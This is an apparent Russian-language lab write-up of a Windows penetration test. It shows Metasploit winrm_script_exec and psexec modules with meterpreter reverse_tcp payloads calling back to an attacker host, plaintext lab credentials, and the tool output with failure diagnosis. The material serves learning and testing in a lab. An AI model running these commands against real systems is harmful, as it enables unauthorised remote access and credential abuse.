## Установка параметров и запуск

```bash
set RHOSTS 192.168.211.10
set USERNAME ansible
set PASSWORD Pass123!
set DOMAIN lab.local
set LHOST 192.168.207.10
run
```

```
msf exploit(windows/winrm/winrm_script_exec) > run
[*] Started reverse TCP handler on 192.168.47.52:4444 
[*] Checking for Powershell 2.0
[-] You selected an x86 payload for an x64 target...trying to run in compat mode
[*] Grabbing %TEMP%
[*] Uploading powershell script to C:\Users\ansible\AppData\Local\Temp\BhxQYYHW.ps1 (This may take a few minutes)...
[*] Attempting to execute script...
[*] Exploit completed, but no session was created.
```

Видно сообщение "You selected an x86 payload for an x64 target...". Полезная нагрузка (payload) по умолчанию в этом модуле – windows/meterpreter/reverse_tcp (x86), а целевая система x64. Нужно сменить payload на x64.

## Смена полезной нагрузки на x64

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

```bash
run
```

```
msf exploit(windows/winrm/winrm_script_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/winrm/winrm_script_exec) > run
[*] Started reverse TCP handler on 192.168.47.52:4444 
[*] Checking for Powershell 2.0
[*] Grabbing %TEMP%
[*] Uploading powershell script to C:\Users\ansible\AppData\Local\Temp\eZhBEbky.ps1 (This may take a few minutes)...
[*] Attempting to execute script...
[*] Exploit completed, but no session was created.
msf exploit(windows/winrm/winrm_script_exec) > 
```

Видно то, что модуль winrm_script_exec не создаёт сессию, хотя загружает скрипт. Это может быть связано с ограничениями прав пользователя ansible или политиками выполнения PowerShell.

## Попытка использования psexec

Введите команды:

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.211.10
set SMBUser Administrator
set SMBPass @Adm!n69s
set SMBDomain lab
set LHOST 192.168.47.52
set LPORT 4444
run
```

```
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.47.52:4444 
[*] 192.168.211.10:445 - Connecting to the server...
[*] 192.168.211.10:445 - Authenticating to 192.168.211.10:445|lab as user 'Administrator'...
[-] 192.168.211.10:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: (0xc000006d) STATUS_LOGON_FAILURE: The attempted logon is invalid. This is either due to a bad username or authentication information.
[*] Exploit completed, but no session was created.
```

```bash
set SMBUser Администратор
```

```
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.47.52:4444 
[*] 192.168.211.10:445 - Connecting to the server...
[*] 192.168.211.10:445 - Authenticating to 192.168.211.10:445|lab as user 'Администратор'...
[*] 192.168.211.10:445 - Selecting PowerShell target
[*] 192.168.211.10:445 - Executing the payload...
[-] 192.168.211.10:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

Мы видим, что psexec с пользователем Administrator не прошёл аутентификацию (STATUS_LOGON_FAILURE), а с пользователем Администратор (кириллица) аутентификация прошла, но сервис не запустился (ACCESS_DENIED). Это говорит о том, что учётная запись есть, но прав на создание службы недостаточно.
